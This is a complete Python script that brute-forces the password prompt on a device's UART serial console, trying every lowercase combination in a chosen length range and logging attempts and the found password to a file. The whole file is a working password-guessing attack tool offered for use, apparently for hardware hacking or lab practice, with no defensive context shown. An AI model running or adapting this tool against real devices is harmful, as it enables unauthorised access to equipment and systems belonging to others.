#!/usr/bin/env python3
import serial
import time
import string
import sys
from itertools import product

class UARTBruteforcer:
    def __init__(self, port='/dev/serial0', baud=115200):
        self.port = port
        self.baud = baud
        self.ser = None
        self.attempts = 0
        self.start_time = None
        self.results_file = None

    def connect(self):
        try:
            self.ser = serial.Serial(
                port=self.port,
                baudrate=self.baud,
                timeout=0.1  # Reduced timeout
            )
            # Clear any pending data
            self.ser.reset_input_buffer()
            self.ser.reset_output_buffer()
            print(f"[+] Connected to {self.port}")
            
            # Wait for initial prompt
            print("[*] Waiting for initial prompt...")
            time.sleep(0.5)  # Reduced wait time
            
            # Send a newline to trigger the prompt
            self.ser.write(b'\r\n')
            time.sleep(0.1)  # Reduced wait time
            
            # Read any initial output
            while self.ser.in_waiting:
                self.ser.readline()
            
            return True
        except Exception as e:
            print(f"[-] Connection error: {e}")
            return False

    def disconnect(self):
        if self.ser and self.ser.is_open:
            self.ser.close()
            print("[+] Disconnected")
        if self.results_file:
            self.results_file.close()

    def init_results_file(self, filename="bruteforce_results.txt"):
        try:
            self.results_file = open(filename, 'w')
            self.results_file.write("UART Bruteforce Results\n")
            self.results_file.write("======================\n\n")
            self.results_file.write(f"Start time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            self.results_file.flush()
            print(f"[+] Results will be saved to {filename}")
        except Exception as e:
            print(f"[-] Error creating results file: {e}")
            self.results_file = None

    def log_result(self, test, response):
        if self.results_file:
            try:
                # Extract just the error message without any additional lines
                if "Invalid password" in response:
                    response = "ERR: Invalid password. Please try again."
                elif "successful" in response.lower():
                    response = "SUCCESS: Login successful"
                
                self.results_file.write(f"Attempt {self.attempts}: {test} - {response}\n")
                self.results_file.flush()
            except Exception as e:
                print(f"[-] Error writing to results file: {e}")

    def wait_for_prompt(self):
        """Wait for the password prompt"""
        timeout = time.time() + 1  # Reduced timeout to 1 second
        while time.time() < timeout:
            if self.ser.in_waiting:
                line = self.ser.readline().decode().strip()
                if "Please enter password:" in line:
                    return True
            time.sleep(0.05)  # Reduced sleep time
        return False

    def read_response(self):
        """Read complete response with timeout"""
        response = []
        start_time = time.time()
        max_retries = 2  # Reduced retries
        retry_count = 0
        
        while retry_count < max_retries:
            while time.time() - start_time < 0.5:  # Reduced timeout to 0.5 seconds
                if self.ser.in_waiting:
                    line = self.ser.readline().decode().strip()
                    if line:  # Only add non-empty lines
                        # Skip prompt lines
                        if "Please enter password:" in line:
                            continue
                        # Only add error or success messages
                        if "Invalid password" in line or "successful" in line.lower():
                            response.append(line)
                            return "\n".join(response)
                time.sleep(0.05)  # Reduced sleep time
            
            # If we get here, we didn't get a response
            retry_count += 1
            if retry_count < max_retries:
                # Send a newline to trigger the prompt
                self.ser.write(b'\r\n')
                time.sleep(0.1)  # Reduced wait time
                start_time = time.time()  # Reset timeout for next retry
        
        return "ERR: No response received after multiple retries"

    def send_input(self, data):
        if not self.ser:
            return None
        try:
            # Clear any pending input
            self.ser.reset_input_buffer()
            
            # Send a newline to trigger the prompt if needed
            self.ser.write(b'\r\n')
            time.sleep(0.1)  # Reduced wait time
            
            # Wait for password prompt
            if not self.wait_for_prompt():
                print("[-] Timeout waiting for password prompt")
                return None
            
            # Send password
            self.ser.write(data.encode() + b'\r\n')
            time.sleep(0.1)  # Reduced wait time
            
            # Read response with retries
            response = self.read_response()
            
            self.attempts += 1
            return response
        except Exception as e:
            print(f"[-] Error sending data: {e}")
            return None

    def bruteforce(self, min_length=1, max_length=6):
        print("\n[*] Starting bruteforce attack...")
        self.start_time = time.time()
        last_rate_time = time.time()
        last_attempts = 0
        
        # Calculate total combinations for worst-case time estimate
        total_combinations = sum(len(string.ascii_lowercase) ** length for length in range(min_length, max_length + 1))
        print(f"[*] Total combinations to try: {total_combinations:,}")
        
        # Try all lowercase combinations from min_length to max_length
        for length in range(min_length, max_length + 1):
            combinations = len(string.ascii_lowercase) ** length
            print(f"\n[*] Trying {length} character combinations ({combinations:,} passwords)...")
            for combo in product(string.ascii_lowercase, repeat=length):
                test = ''.join(combo)
                response = self.send_input(test)
                
                if response is None:
                    print("[-] No response received, retrying...")
                    time.sleep(1)
                    continue
                
                # Log the attempt
                self.log_result(test, response)
                
                # Calculate and display rates every second
                current_time = time.time()
                if current_time - last_rate_time >= 1.0:
                    # Calculate current rate
                    current_rate = (self.attempts - last_attempts) / (current_time - last_rate_time)
                    
                    # Calculate average rate
                    elapsed = current_time - self.start_time
                    avg_rate = self.attempts / elapsed if elapsed > 0 else 0
                    
                    # Calculate estimated time remaining
                    remaining_attempts = total_combinations - self.attempts
                    time_remaining = remaining_attempts / avg_rate if avg_rate > 0 else 0
                    
                    # Calculate percentage complete
                    percent_complete = (self.attempts / total_combinations * 100) if total_combinations > 0 else 0
                      
                    # Display statistics
                    print(f"\r[*] Current: {current_rate:.1f} p/s | Avg: {avg_rate:.1f} p/s | "
                          f"Progress: {self.attempts:,}/{total_combinations:,} ({percent_complete:.1f}%) | "
                          f"Current: {test} | "
                          f"Elapsed: {elapsed/60:.1f} min | "
                          f"Est. remaining: {time_remaining/60:.1f} min | ", end="", flush=True)
                    
                    last_rate_time = current_time
                    last_attempts = self.attempts
                
                # Check for successful login
                if response and "successful" in response.lower():
                    elapsed = time.time() - self.start_time
                    success_msg = (f"\n[+] Password found: {test}\n"
                                 f"[+] Attempts: {self.attempts:,}\n"
                                 f"[+] Time taken: {elapsed:.1f} seconds\n"
                                 f"[+] Average rate: {self.attempts/elapsed:.1f} passwords/second")
                    print(success_msg)
                    if self.results_file:
                        self.results_file.write(f"\n{success_msg}\n")
                        self.results_file.flush()
                    return test

    def finalize_results(self):
        if self.results_file:
            try:
                elapsed = time.time() - self.start_time
                self.results_file.write(f"\nFinal Statistics:\n")
                self.results_file.write(f"Total attempts: {self.attempts}\n")
                self.results_file.write(f"Total time: {elapsed:.1f} seconds\n")
                self.results_file.write(f"End time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                self.results_file.flush()
            except Exception as e:
                print(f"[-] Error finalizing results file: {e}")

def main():
    if len(sys.argv) < 2 or len(sys.argv) > 4:
        print("Usage: python3 bruteforce_login.py <serial_port> [min_length] [max_length]")
        print("Example: python3 bruteforce_login.py /dev/serial0 3 5")
        sys.exit(1)

    port = sys.argv[1]
    min_length = int(sys.argv[2]) if len(sys.argv) >= 3 else 3
    max_length = int(sys.argv[3]) if len(sys.argv) == 4 else 3
    
    if min_length > max_length:
        print("[-] Error: min_length cannot be greater than max_length")
        sys.exit(1)
    
    print(f"[*] Using password length range: {min_length}-{max_length}")
    
    bruteforcer = UARTBruteforcer(port=port)

    if not bruteforcer.connect():
        sys.exit(1)

    try:
        # Initialize results file
        bruteforcer.init_results_file()
        
        # Start bruteforce attack
        password = bruteforcer.bruteforce(min_length=min_length, max_length=max_length)
        
        # Finalize results
        bruteforcer.finalize_results()

    except KeyboardInterrupt:
        print("\n[!] Bruteforce interrupted by user")
        bruteforcer.finalize_results()
    finally:
        bruteforcer.disconnect()

if __name__ == "__main__":
    main() 